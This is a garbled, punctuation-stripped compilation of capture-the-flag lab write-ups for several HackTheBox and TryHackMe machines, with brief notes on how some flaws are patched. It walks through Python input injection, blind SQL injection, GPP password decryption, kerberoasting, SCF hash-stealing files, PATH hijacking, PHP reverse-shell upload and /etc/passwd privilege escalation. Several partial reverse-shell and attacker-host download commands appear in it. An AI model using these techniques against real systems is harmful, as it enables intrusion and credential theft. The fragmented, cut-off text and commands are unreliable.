wget or curl as it is not on the docker container  However  in the theme of this box  we can download files using python with the urllib request module reports PythonPlayground image4 png  reports PythonPlayground image9 png  reports PythonPlayground image3 png And we are rootBONUS reports PythonPlayground image7 png Here we can see all the blacklisted strings  Note how the script checks for  import   rather than  import   This seemingly unimportant space makes the difference between allowing   import   and not  Changing this makes the program invulnerable  as far as I know   Thank you to

report form instead because it is better formatted reports Develpy image8 png  reports Develpy image28 png This was a nice little challenge created by  stuxnet  This box had quite a unique foothold  in the sense that it was made purely for challenging your knowledge about the security of python scripting  A lot of programmers do not think about security when they make their programs  rather they think about just getting their program to perform a desired function  A large part about cybersecurity is about finding bugs in programs and exploiting them to make them do functions that they were not designed to do  Let s jump right in  and I will go into detail about security related to python scriptingReconnaissanceAs usual  I will start with an nmap scan reports Develpy image19 png We see there are two ports open  port 22  ssh  and port 10000  snet sensor mgmt    As can be seen from the output  nmap is not sure what service is running on port 10000  but apparently it is getting some HTTP output  Let s visit the webpage and see what we get reports Develpy image26 png Getting UserWe get a strange response that looks like an error in some python script  It is especially interesting that the name  GET  is not defined  This looks a lot like a result of a GET request   Let s fire up burpsuite and verify this  Refreshing the page and intercepting our request we see the following reports Develpy image2 png This is a very standard GET request  In the output we see reports Develpy image10 png So it looks like this script is looking at our request method and inputting it into the script  The program most likely expects an integer as the input  so let s modify our request so that we can see how the script is designed to behave reports Develpy image22 png And we see the following response reports Develpy image11 png Up to this point with the information that we have gathered about how this script works  it is likely that the script is performing some kind of evaluation on our input  One more thing I checked before I tried to input malicious code is to confirm that the script evaluates what we send  In our previous request  instead of inputting the number 4  let s input 0 reports Develpy image25 png Now we don t see the strings beginning with  Exploiting tryhackme   So let s change 0 to 0 1 to see if the python script is evaluating the math reports Develpy image18 png Notice how now there is one string beginning with  Exploiting tryhackme   This indicates that the script calculated 0 1  So we have confirmed that the script is using some kind of evaluating function  Let s input some malicious python code so that we can get a reverse shell  We can import the os module to execute system commands reports Develpy image16 png  reports Develpy image5 png Looks like we can execute commands as the user king  So let s get a reverse shell reports Develpy image12 png  reports Develpy image14 png  reports Develpy image9 png Privilege Escalation to RootCool  We got a shell  Let s see what is in king s directory reports Develpy image3 png We see some interesting files  but the root sh file especially stands out  It is one of the only files in king s directory that is owned by root  Looking at the contents of the bash script  we see that it only has one line reports Develpy image20 png First of all  this looks like a strange thing to have in a bash script  Why not just type that command in the first place  It seems likely that there is some cronjob running this script  Second of all  python is being run without specifying it s full path  If there is indeed a cronjob  then it should only be running commands that are specified within a full path  Unfortunately however  we do not have write access to the python binary  and it is likely that root s path is set to its default  So  it looks like we probably can t do some sort of path privilege escalation  In  etc crontab we see the following reports Develpy image27 png Tthere are definitely cron jobs running on this system  At this point I downloaded  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653961217842478 usg AOvVaw3Xy4wBS6ssPN4XQD4bXbER  and saw the following interesting output when I ran it reports Develpy image23 png It looks like there might be some service running on port 8080 that is only open to localhost  Running netstat  we can confirm this reports Develpy image15 png We can forward this port using socat so that it would be remotely accessible  reports Develpy image24 png  reports Develpy image13 png We see this is a web server that has an upload feature reports Develpy image6 png Let s just touch a file with the extension  py and see what happens reports Develpy image1 png The file was uploaded to a directory called  media  Remember the root sh script which ran any file within the  media directory  We can confirm that the server ran this script by looking at pspy reports Develpy

1653961217844668 usg AOvVaw3T0s2eu ixwvfoqmeVXd6   and put it in our script reports Develpy image17 png After uploading  we wait a bit for the cronjob to run again  and eventually we will get a hit back reports Develpy image4 png BonusThat was a lot of fun  but let s see how and why we were able to get a foothold on this box  We ll start by inspecting the script that was related to the error on the webpage reports Develpy image21 png The old version of python  python2  has a dangerous function called input which evaluates the input of a user  This is a security risk within the function  and it is strongly discouraged from being used  Instead  python encourages the use of raw  input which treats the user s input as a string regardless of how the user formats it  this is in contrast to the input function which does not modify the type of the input   Modifying the script to use raw  input instead of input successfully patches the python injection vulnerability  Note that python3 has since modified the input function to behave like raw  input so as to patch this vulnerabilityThank you to  stuxnet for such a fun challenge  I hope you learned a bit from my red team analysis of the box and hopefully a bit of the blue team as well",

this box is that gobuster would not work due to a DoS protection against 404 http errors  So how would we find the potentially vulnerable web pages of the web serverReconnaissanceThe first thing that I always do when targeting a box is adding its ip to my  etc hosts file  because it is easier to remember a hostname than an ip reports Writeup image38 png Let s start with enumerating the ports of the box nmap  sC  sV  oA nmap nmap writeup htb reports Writeup image24 png Looks like there are only two ports running on this box  Because this was a small amount  I ran an nmap scan to enumerate all ports with the  p  flag  but I did not discover any other ports  Looking at the result of the nmap scan  the box is running the Debian Linux distribution  noting information like this is important when trying to understand the makeup of a box   Software can differ depending on the operating system   distribution of a system  Nmap discovered a directory  writeup  from the robots txt file  Let s look at the webpage on http   writeup htbWeb Enumeration reports Writeup image8 png First time I saw this webpage  I foolishly did a gobuster because I did not read the message in red  As a result  I got banned and had to wait a couple of minutes for my ip to no longer be blacklisted  Looking at the message  we can see that there is a DoS script in place to look for 40x errors  this unfortunately includes 404 errors which we need for gobuster to work   Another potentially important thing to note is the email jkr writeup htb  This means that there might be a user jkr on the box  which may or may not come handy   It s a good habit to note down any potentially important information in a notes txt fileIncidentally  because I added the ip to my  etc hosts file and navigated to the http   writeup htb page  it is important to check also http   10 10 10 138 to make sure there is no virtual host routing in place  for this box it turns out that there is no vhost routing   Let s see what is on the  writeup directory reports Writeup image6 png Visiting the writeup writeup  we get the following reports Writeup image5 png There is nothing interesting in this page  or in any of the other

one exploit here that looks promising  the SQL Injection exploit for versions   2 2 10  All other exploits either require credentials or are too old  Let s mirror this exploit and examine it  The key parts of this exploit is the vulnerable page and payload reports Writeup image7 png  reports Writeup image28 png  reports Writeup image30 png There is a parameter in the News module called m1 idlist that is vulnerable to SQL injection  As we can see from the payload  this script uses a blind SQL injection attack to extract credentials from the affected system  The attack works by asking the server to sleep for a certain period of time if a certain statement is true  So if we find that a request of ours makes the web server take an unusual amount of time to respond to us  then we know that the statement ran true  This means that we could ask the server the followingPentester   Hey web server  You should sleep for 1 second if you have a username in the cms users table that starts with the letter aWeb server   Hi Pentester  I don t have a user in my cms users table that starts with the letter a  so I am not going to sleep for 1 secondPentester   No problem  You should sleep for 1 second if you have a username in the cms users table that starts with the letter bWeb server   I actually have a user in my cms users table that starts with the letter b  so I will sleep for 1 secondPentester   Okay  so it normally takes the web server to respond to me after 1 second  but now it took the web server two seconds to respond  There is probably a user in the cms users table that starts with the letter b  Let s ask the web server another question   Hey web server  it s me again  You should sleep for 1 second if you have a username in the cms users table that starts with the letters baI think you get the point  Running the exploit with python 46635 py  u http   writeup htb writeup we get the hashed credentials of the user jkr reports Writeup image42 png Now all we have to do is crack the hash  Because we have the salt of the hash  we can crack the hash a lot more easily  The hashed password is 32 characters long which suggests that it is an md5 hash  We can use hashcat to crack the password  but this handy exploit even has a cracking function  albeit it is not as fast as hashcatScript Method reports Writeup image17 png  reports Writeup image26 png Hashcat Method

We can conclude that the password is a salted md5sum  Viewing hashcat s example hashes  we can see the mode that corresponds most to what we are looking for reports Writeup image1 png As you can see  mode 20 looks like the right hash so let s crack it  Make sure to first put the hash in the format hash salt as described by the  Hashcat   Example Hashes  https   www google com url q https   hashcat

image34 png Incidentally  the purpose of salts is so that multiple hashes in a compromised credential database do not get cracked simultaneously  It is highly likely that in a database of over a million users  many users have the same password  This would mean that two users with the password of 0xd4y would both get cracked easily by use of a  rainbow table  https   www google com url q https

as grep are actually just binaries that are stored in some directory on your machine  typically it is stored in  bin reports Writeup image3 png The point of PATHs is so that you don t have to constantly type  bin grep whenever you want to run that command  it s just tedious   An important thing to note is the order of what s in the  PATH variable  By default   usr local bin comes before  bin  This means that if we made a file and put it in  usr local bin  then when we run grep  we are actually running  usr local bin grep and not  bin grepProof of Concept reports Writeup image11 png  reports Writeup image13 png    after logging out and logging back in reports Writeup image22 png Note that the user who created a binary in the  usr local bin path must logout and log back in for it to affect him  All other users on the box do not need to do that  I am not sure why   This means that in a real scenario  before the command is hijacked  a victim could run a command and it would work just as expected  After it gets hijacked  the victim could run that same command  during the same login session  and the hijacked binary would get executed instead  This is why for the sake of security  it is imperative that high privileged users execute the full path of commands  especially when it comes to cron jobs   Let s look for cron jobs running as root  There might be one that is running a command without using its full path  There is a great script on github called  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust

image10 png When first doing this box  I noticed that whenever I put a binary in the  usr local bin path or the  usr local sbin path  it would keep getting removed after some time  This cronjob is probably the culprit  I went into this rabbit hole for a long time  I tried using symbolic links to delete files  but it did not work  This privesc was especially difficult for people hacking on private instances  such as myself  because watch what happens when a person logs into jkr reports Writeup image39 png Suddenly  we are met with a whole bunch of commands that don t use the full path  We have sh  run parts  and uname  Each of these commands is run by UID 0 which is root  So if we put a reverse shell in one of these binaries and copy it to the  usr local bin path  it will get executed and we will have a shell  The bash reverse shell did not work for me  so I used the perl reverse shellperl  e  use Socket  i  10 10 14 5   p 9001 socket S PF INET SOCK STREAM getprotobyname

way  as well as having strong passwords that are hard to crack  Something that really makes this box stand out is not so much the vulnerabilities themselves  but rather the reason why they are easily exploitable in the first place  Microsoft essentially made themselves vulnerable  as they spoke a little bit too much on THEIR OWN website  Come check out the writeup to see what I mean date    2021

form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Active image4 png  reports Active image8 png Just like Bastion  this was another realistic Windows box  However  instead of it being centered around Bastion hosts  this box was about the Windows Active Directory service  This machine was vulnerable due to the use of Group Policy Preferences  GPP  for managing passwords  The passwords stored in the Groups xml file are AES 256 encrypted with a static key  but the encryption key is publicly available on Microsoft s site  After getting the credentials of a low privileged user  we find that we can get the hash of the Administrator by abusing the way kerberos authenticates its users  this abuse is called kerberoastingRECONAs usual  I will add the ip of the box to my  etc hosts file and call it active htb  Let s enumerate the ports of the machine so we can find some attack vectorsnmap  sC  sV  oA nmap nmap active htb reports Active image12 png Immediately  we can see that this is a Windows box running the Active Directory  AD  service  This can be denoted due to the fact that ports 53  DNS   88  Kerberos   139   445  SMB   and 389  636  3268  3269  LDAP  are open  The first thing that comes to mind is to enumerate the SMB protocol on port 445smbmap  H active htb reports Active image7 png So we have READ permissions to the Replication directory  Let s check all the files inside this directory with the   R flagsmbmap  H active htb  R Replication reports Active image9 png  reports Active image17 png At this point I was stuck for a while  As it turns out  there is something wrong with the smbmap tool on my machine  Even after updating smbmap  for some reason the recursive search does not show all the files in the Replication directory  Every pentester should know the extent of their tools  as well as the reliability of each tool  Some tools can be more reliable  or stealthier  or faster  whatever it is that you are looking for   It is important to understand the difference in each tool  and to know which one to use depending on what you need  I found out that mounting the share proved to be the most reliable  and convenient    check out the  Bastion writeup  https   www google com url q https   0xd4y.com Writeups HackTheBox Bastion 2520Writeup pdf sa D source editors

image16 pngAnd another strange problem  I was never able to fix this error  and I still have no idea why I keep getting it  Even tweaking the version number to match the SMB server didn t work  I think it is because the Guest account is disabled  but I didn t see how to anonymously access the SMB share otherwise  So now I went to plan C  which is just to recursively download everything on the Replication directory  obviously this is not ideal  as there could be a lot of useless and large filesRETRIEVING CREDENTIALS reports Active image15 png Looking through all of the files  we see the

the fact that it is only 32 bits is alarming as generally this is quite an insecure block size  Even worse  the encryption key is stated blatantly on Microsoft s documents   AES 256 key  https   www

Microsoft document is how the gpp decrypt tool works to decrypt the encrypted cpassword string reports Active image13 png Notice how the key used in this script to decrypt a string matches that of the key in the Microsoft documentSo  let s see the magic of this tool and run it against our string reports Active image10 png And we get the password as GPPstillStandingStrong2k18  The first thing I did was to login to enumerate the SMB share with the credentials SVC  TGS GPPstillStandingStrong2k18 reports Active image19 png Although the SVC  TGS user has access to more files than Guest  there were no interesting files to retrieve  I tried to find a way to get a shell on the box  but the SVC  TGS user was too low privileged  At this point I sat back for a while and took a deeper look at the results of the nmap scanPRIVILEGE ESCALATIONRemember port 88  kerberos  from the nmap scan   Kerberos is all about authenticating a user over an untrusted network  And anyways  what in the world is a name like SVC  TGS  That username certainly doesn t sound as cool as 0xd4y  As it turns out  TGS stands for Ticket Granting Server  and I m not sure what SVC is but I think it is the abbreviation for service   The TGS is part of the KDC  Key Distribution Center  and exists to validate the use of a ticket for a specific purpose  What we want to do is to scan the active directory for the Administrator s SPN  Service Principal Name  value and then request the service tickets from the Active Directory which we will crack offline  The essential part of this attack is that the service tickets are hashed using the password of the user  in this case the Administrator as this is the account we are targeting   I highly encourage you to read the article  Ticket Granting Service   an overview  https   www google com url q https   www sciencedirect com topics computer science ticket granting service sa D source editors ust 1653954214358739 usg AOvVaw2DWhx4i9AXLp3lbICjayy2  as it really helps in understanding how Kerberos works  Let s use the GetUserSPNs py impacket script to extract Administrator s hash reports Active image3 png Unfortunately  when we run this script we are met with an error related to clock skew between the client  us  and the server  active htb   This is due to a security feature by Microsoft to try to mitigate replay attacks  A replay attack is when an attacker intercepts a communication  and then modifies the request to make the receiver of the communication perform a malicious task  Kerberos uses time stamps to see if the time between the request of the user and the time of the server matches within a certain margin of time  In the case that the clock skew does not fall within the acceptable range  then it is possible that the sender of the communication modified the request to perhaps make the receiver perform something malicious for his own benefit  As written by Microsoft s document on clock skew  Kerberos Clock Synchronization

1653954214359722 usg AOvVaw30mRtT10rJxBsp0OqJ0AMx   the default acceptable range is 5 minutes and our skew is a little over 9 minutes reports Active image1 png      reports Active image21 png Let s change the date on our host machine to match that of the server and then test the clock skew reports Active image20 png Now when I run the same nmap command reports Active image14 png The reason why the clock skew is 4 minutes and not something like a couple of seconds is because it took my nmap scan a while to completeThe GetUserSPNs py impacket script should work now  as we found out that the default acceptable clock skew range is within 5 minutes  Running the command again  we now get a different output reports Active image11 png As we can see  we get the Kerberos 5 TGS REP hash for Administrator  We can use the hashcat   example hashes command to find the mode required to crack this hash reports Active image6 png So we found out that the mode is 13100  We can now crack the hash with hashcat  m 13100 hash rockyou txt  As I recommended in previous writeups  it is highly encouraged to crack hashes on your host machine because it is much quicker than doing it on a VM  Eventually  the hash will be cracked revealing that the password to the Administrator account is Ticketmaster1968  Now we can get a SYSTEM shell on the box with yet another impacket python script  psexec py  have I mentioned how cool impacket is    Using this script did not work for the SVC  TGS user  because we did not have write access to the ADMIN  directory  Now as the Administrator  we have write access to ADMIN  which will let us create a named pipe to the PSExec service  which will allow us to directly send commands as NT AUTHORITY  SYSTEM  the highest privileged Windows user  You can read

its  a href    https   0xd4y.com reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Bastion image12 png  reports Bastion image21 png This was an amazing box that really showed the importance of using google  It was unique in that it did not have a web server port  The great thing about this box is that it was very realistic  as intended by the author L4mpje  Let s get right into itAs usual  I added the ip to my  etc hosts file and called it bastion htb  Afterwards  I ran the normal nmap  sC  sV  oA nmap nmap bastion htb which revealed many ports  Just to be sure that I had all the ports  I ran nmap  p    max retries 0 bastion htb  Note the max retries flag which  when set to 0  performs the scan at it s quickest but most unreliable speed  This is because the max retries flag is used to specify the maximum port scan probe retransmissions  and the less transmissions you send  the higher likelihood that you will have false negatives and positives  After scanning all ports  the following ports were revealed  47001 49664 49665 49666 49667 49668 49669 49670  Due to this  I ran the thorough nmap scan once again  this time specifying the ports   nmap  sC  sV  oA nmap nmap  p 22 135 139 445 5985 47001 49664 49665 49666 49667 49668 49669 49670 bastion htb reports Bastion image4 png Looks like the high ports that the nmap  p  command found were of no importance  Looking at the results however  two ports in particular stand out  This Windows box is running ssh   That s certainly strange as I have not seen any other Windows box with ssh  more on this later   The other port that stands out is port 445  Samba a k a SMB which stands for Server Message Block   and it is configured to allow guest access  This seems like the most obvious attack vector  so let s see what we findsmbmap  H bastion htb  u guest reports Bastion image3 png Again  two things in this output stand out  First of all  there is a Backups directory which we have READ and WRITE access to  The fact that we have WRITE access to this is a huge red flag  This means that we could drop a malicious SCF  shell command file  to potentially steal hashes from users who access this file  We can write a  scf file with the following contentsShellCommand 2IconFile     10 13 37 2  share  0xd4y icoTaskbarCommand ToggleDesktopWhenever a user browses to this file  Windows will attempt to authenticate to our share with the credentials of the user  meaning that we can capture these credentials  albeit the password is hashed   The fact that we have write access to a directory containing backups is especially alarming  as which users would normally access such a directory  Probably domain admins  There is an excellent article on this topic that I highly recommend you read   https   pentestlab blog 2017 12 13 smb share scf file attacks   https   www google com url q https   pentestlab

easy box and there are no real users on the system to execute the  scf file  as this is just a box rather than a real attackThe other thing that stands out is this smbmap message   Work      Unable to remove test directory at     bastion htb  Backups  GZHGUJOWDT  please remove manuallyThe smbmap tool knows that we have write access to   Backups because it was able to write to it  However  the fact that it was not able to remove it shows that this created directory could be a way for defenders to find out that someone may be up to something malicious  In a real penetration testing environment  it may be more wise to use smbclient  L  U guest bastion htb which lists the shares  but does not list the permissions reports Bastion image17 png Ok  enough stalling  Let s just see what s inside this   Backups directory  I created a  smb directory on my machine  so that if I download a file it goes straight to the  smb directory  and connected to the SMB sharesmbclient  U guest   bastion htb Backups reports Bastion image6 png I downloaded the note txt file using get note txt and viewed it on my host machine reports Bastion image20 png This file is a hint that there is probably a large backup file somewhere in this SMB share  Let s keep enumerating  Eventually you ll find the following directory reports Bastion image14 png Incidentally  we know that there is probably a user named L4mpje on the system  it is always important to save information like this in a file where you keep your notes   Two files here stand out  first there were two ports that stood out  then two interesting things with the SMB share  now this   why are there always two things that stand out     The  vhd  virtual hard disk  files are quite conspicuous  these files are absolutely massive  One is about 37MB while the other one is 5 4GB and are no doubt the backup files that the note txt message was referring to  I foolishly downloaded both files and inspected them when I was first going through this machine  so let s see how to view these files without waiting a million years for them to finish installingThe mount command does the trick  Running the command sudo mount  t cifs   bastion htb Backups smb   o username guest we see the full listing of the directory Backups  The   t option for mount specifies the type of file share we want to mount  CIFS stands for Common Internet File System and is a dialect  or particular implementation  of the SMB protocol reports Bastion image10 png Note the strange directory names that smbmap created  Anyways  let s get right to the  vhd files reports Bastion image15 png When I was first going through this box  I mounted both the  vhd files  but the 37MB one is not interesting as it just has boot files  Let s mount the  vhd file and inspect its contentsguestmount  a 9b9cfbc4 369e 11e9 a17c 806e6f6e6963 vhd  m  dev sda1   ro   business hackthebox easy windows bastion mnt reports Bastion image2 png And we get a whole listing of files  At this point  I looked through a ton of data  but I couldn t find anything interesting laying around  However  there is still a way to extract credentials due to a huge oversight of the sysadmins  They accidentally backed up the files SYSTEM and SAM  Security Account Manager  located in  Windows System32 config reports Bastion image16 png So the note really wasn t kidding when it said to not transfer the entire backup file locally  A lazy sysadmin did not realize that he backed up even the SAM and SYSTEM file  THESE FILES ARE HIGHLY SENSITIVE    The SAM file is a database file that stores credentials of the local users  These credentials are hashed and encrypted by the system boot key which is located in SYSTEM  This means that if you have access to the SYSTEM file  then you can decrypt the credentials revealing their hashesWe can use the impacket secretsdump tool to extract hashed credentials  Let s copy these files to our root directory   bastion  and continue with the commandimpacket secretsdump  sam SAM  system SYSTEM local reports Bastion image11 png Well  now we have the hash for the L4mpje user  Notice how Administrator and Guest have blank LM and NTLM hashes  This indicates that Administrator and Guest were most likely disabled when this file was backed up  even more evidence that this was probably backed up with the SYSTEM user   but this could be

host machineLet s ssh into the box and hope that L4mpje has not updated his password since the  vhd file was backed up reports Bastion image5 png It was expected that L4mpje did not change his password  Not because this is meant to be a vulnerable machine  but this is completely realistic  How often does a person change his passwordWe can now grab user txt  but how are we going to escalate to administrator  This is where having knowledge on the basic file system of Windows is useful  After a lot of enumeration  you will notice that there is a particular directory on this box which stands out on C   Program Files  x86 reports Bastion image9 png The mRemoteNG directory is not part of the default Windows build  Let s inspect it further reports Bastion image7 png Nothing in this directory looks out of the ordinary  In any case  we should look into this for multiple reasons1   mRemoteNG is a tool for connecting and managing remote systems  protocols such as SSH  RDP  etc  are used2   mRemoteNG is not part of the default Windows build 3   This box is called Bastion  hinting at the possibility that this box is a bastion host  A bastion host allows external connections to a private network  Due to the increased probability of an attack on a bastion host  it must be hardened to withstand such attacks  As such  typically there are very few services running on a bastion host  in our case the bastion host is running SSH and an SMB share   Ideally  a bastion host acts as a jump server once a connection has been established to it  a jump server is used to access devices in a separate security zone   Essentially  this means after connecting to a bastion host  authorized users can have access to private instances located within the virtual private cloud  VPC  Think of a bastion host as a bastion is in real life  hence the name   You can walk up to the bastion  knock on the castle walls  but you are not allowed inside unless you are authorized  If you attack the bastion  you may be met with defensive fireBLACKLISTED reports Bastion image1 png After a bit of googling  you will find a great article explaining the insecurity of mRemoteNG   https

machine  and the intended solution  There is a lot to learn here about web security and networking  and I highly encourage you to read this writeup date    2021 02 21 image     images 0xd4y logo gray

you read the original report form instead because it is better formatted reports Bank image5 png  reports Bank image3 png Never underestimate the power of BurpSuite  In this box  I will go through the unintended and intended solution  There is a lot to learn in the unintended solution  and this is actually how I went about rooting the box  After I show you the unintended solution  I will demonstrate how the author of the box   makelarisjr  intended to go about rooting the machineAs always  we will enumerate the ports with nmap  sC  sV oA nmap nmap 10 10 10 29 reports Bank image7 png Immediately  something unusual strikes us  Port 53  the port for DNS  is running on the TCP protocol  Typically  this runs on UDP  because UDP is faster and DNS does not need to handle large requests  The only reason why this port would be run on TCP is perhaps for zone transferring reports Bank image26 png Now as a habit  before I go onto trying to get root  I like to add the ip of the box to my  etc hosts file  That way  I don t have to memorize the ip of the machine reports Bank image18 png Before we go to the web server  let s enumerate the subdomains with the dig command reports Bank image12 png The AXFR protocol is typically used in conjunction with TCP  Cool  Let s add the subdomains to our  etc hosts file reports Bank image33 png Unfortunately  all of these subdomains  except for bank htb  seem to be a rabbit hole  When I visited chris bank htb  ns bank htb  and www bank htb  I was met with the following default ubuntu page reports Bank image30 png This same page appeared when I went to 10 10 10 29  Running a gobuster scan on all of these pages didn t reveal anything interesting  However  bank htb presented me with this login page reports Bank image10 png I tried to see if this login page was vulnerable to SQL injection  but I couldn t find any vulnerabilities  After enumerating the directories with gobuster  I found the following reports Bank image28 png The 302 status code is a redirection  This is why when I visited  support php  I was redirected to  login php  However  let s see if this redirection was configured properly  A quick test for this is to curl the directory and pipe it to wc  ccurl http   bank htb support php wc  cWe see that the response returns 3861 characters  This is very odd  as typically redirect pages don t contain more than a couple hundred characters  Let s see what happens if we look at this through burp  Make sure to intercept server responses in the  Options  tab under  Proxy reports Bank image1 png Let s intercept our request when going on http   bank htb support php reports Bank image4 png After forwarding this request  we intercept the server response which is quite long with html tags  indicating that it is displaying a webpage reports Bank image31 png As expected  we get a 302 Found response  Note how we can view the source of  support php  As you can probably deduce  this is a vulnerability in itself  This means that we don t need to authenticate in order to view this page  Changing 302 Found to 200 OK and forwarding this request  we can now interact with the support php page reports Bank image13 png Here you can try to upload an image file  php file  or whatever you d like  As it turns out  the webpage only allows image files  Eventually  you ll find that you cannot upload a reverse shell  due to file restrictions  without knowing a particular secret  That secret lies in a comment embedded in the source code  always check the source code reports Bank image16 png Uploading a php reverse shell with the extension of htb instead of php should do the trick  I used the reverse shell from pentestmonkey which you can find by visiting the following link   https   github com pentestmonkey php

chris   Now let s get root txtThe first thing I always do when getting a reverse shell is sudo  l and groups  Nothing was out of the ordinary  so I went to do the next thing that I always do  I set up a python http server on my machine hosting linpeas sh  then on the reverse shell I went to the  tmp directory  downloaded the linpeas sh file  and ran it  you can find linpeas using the following link

ust 1653958332695769 usg AOvVaw1MOcd4iGwIozIAy 2spgF6    After running linpeas  the first thing I do is skim the output for anything that is highlighted in yellow with red text  this indicates a high chance of a privilege escalation vector   If linpeas doesn t find anything completely out of the ordinary  I look through the output more closely  For this box  there was no need to look any further as a critical vulnerability was found reports Bank image29 png We have write access to  etc passwd  If we create a user with id 0 in the  etc passwd file  then we will be root  The first thing to do is to create a unix crypt password  the password hash used for linux systems   and put this in the  etc passwd file corresponding to a user that we create reports Bank image25 png This is the  etc passwd file before editing reports Bank image32 png This is the  etc passwd file after editing reports Bank image34 png Now we can su to 0xd4y  the user that we created  with the password of password reports Bank image27 png Incidentally  I could have also just changed the root password by replacing the  x of the root entry with the password hash  This works because  etc passwd takes precedence over  etc shadow  Additionally  adding a new user with id 0 also works because Unix systems identify users by their id  not by their username  This was a very fun box and really highlighted the power of BurpSuite  However  as it turns out  this way of rooting the box was unintended  So let s go through the way that the author intendedIntended SolutionAs it turns out  when running a gobuster scan

files further on my machine  I assumed since this is a CTF  there is probably a file in this big mess that is different  I checked the Full Name parameter of each file to see if there was something different in one of the files using grep Name  rThis command lists the Full Name parameter in all the files in the directory  After doing this I noticed a pattern  Each encrypted full name is 128 characters in length  I isolated each full name by using the tr command reports Bank image9 png Now we have Full Name  the encrypted full name  and the file path on different lines  We are only interested in the encrypted name and the file path for now  so let s do a grep  v on  Full Name   So far our entire command looks like this  grep Name  r   tr        n  grep  v NameNow we have a bunch of strings that are 128 characters in length  so let s do a grep  v on any string that s more than 120 characters  I arbitrarily chose this number  you could have chosen whatever number suits you as long as it isn t too small and not more than 128   After grepping out the 128 character length strings  my terminal was now only flooded by the path of each file reports Bank image2 png Finally  let s do a grep  v on  acc  to get rid of the flooding of those file paths  After doing all of this we get the following output reports Bank image17 png Interesting  There must be a file somewhere in this directory with the full name of Chris Christopoulos  Let s grep for this specific string in the directory to find the file containing this string reports Bank image6 png  reports Bank image23 png These aren t the ssh credentials for chris  so let s use these credentials on  login php reports Bank image20 png  We are greeted with a nice dashboard and an interesting balance  There is nothing out of the ordinary to be seen here  The real vulnerability lies in the support php directory  so let s visit that reports Bank image15 png Well  that looks a lot nicer than what we saw in Burp  I will skip the methodology of getting the reverse shell  as I already covered this in the unintended solution aboveA very common way to escalate privileges is by abusing setuid binaries  This can be viewed using the find    perm  4000 2  dev null  command  Using this  we find the following binaries reports Bank image24 png One setuid binary in particular stands out   var htb bin emergency  Let s just run it and see what happens reports Bank image14 png  reports Bank image21 png BonusWhen I was first doing this box  I actually did not know about the trick of intercepting a server response and

boxEnumerating the ports  we find that only ports 22 and 80 are open reports Keldagrim image2 png Looking at the results we don t find anything out of the ordinary  except for the httponly flag not being set  Let s just check out the website and see what we find reports Keldagrim image12 png xt file  We are met with a very simple page with a couple of directories  On the  Our Team  tab we find

option reports Keldagrim image1 png Unfortunately the admin option is grayed out  I couldn t find anything more useful in this so let s use our trusty tool  Burpsuite  I captured a request to the  team directory and saw a couple of very strange things reports Keldagrim image10 png First of all  there is a session cookie which is encoded in base64  Decoding this  we see that Z3Vlc3Q  is the base64 encode of guest  When base64 encoding the string  admin   YWRtaW4   and pasting that into the session cookie  we see that the content length changes  Let s use the developer tools  paste this base64 string in the session value  and reload the page reports Keldagrim image5 png And we are now the admin  Unfortunately  there is not much that has changed except for the strange  sales  cookie which is also base64 encoded  Decoding this  we see that it corresponds to the  2 165 we see on the screen  At this point  I was stuck for a long time  but at the back of my mind was this strange server in one of my requests to the page with all the packages to be bought reports Keldagrim image13 png Server  Werkzeug 1 0 1 Python 3 6 9This is what comes to mind  Seeing Werkzeug and python brings to mind that maybe Flask has something to do with this  After a lot of research  it seemed that this box might be vulnerable to SSTI  Server Side Template Injection   I came across a great

from TryHackMe that taught basic SQLi injection  It was structured in a CTF format in which the student would achieve each flag from solving a task  more on this later   Although this box was structured in a way to guide the student  I like to try to complete the box without the hints provided by the questions  and rather than taking you through how to complete each task in sequential order as the author intended  I will explain how I went through this box  As a result  I went the extra mile when completing this box without realizing it  After completing this box  I read many write ups but not one mentioned the secret flag  and more interestingly  no write ups rooted the box  I only found out later that the author of this box did not intend for the student to root the box   perhaps the author did not realize how the RCE vulnerability could be exploited     We will explore this more in detail further in this writeupAs usual we will enumerate the machine with nmap  sC  sV

thinking of commands similar to cat such as head and tail  but neither worked  Eventually  I tried less which successfully revealed the contents of the fifth flagNow at this point  I didn t know that I wasn t supposed to go any further so I kept thinking of ways on how I would get a reverse shell  I tried many commands such as curl  bash  nc  perl  python  and many more commands  I was thinking about how it was possible to get a reverse shell without specifically typing any of these blacklisted strings  I came to the conclusion that if I could echo a string to a text file  and then somehow prepend text to it  then I could create a file that would contain a malicious command  Here is the methodologyecho  url  attacker ip  rev  o  tmp reverse  shell     tmp malicious  commandsed  i  1s
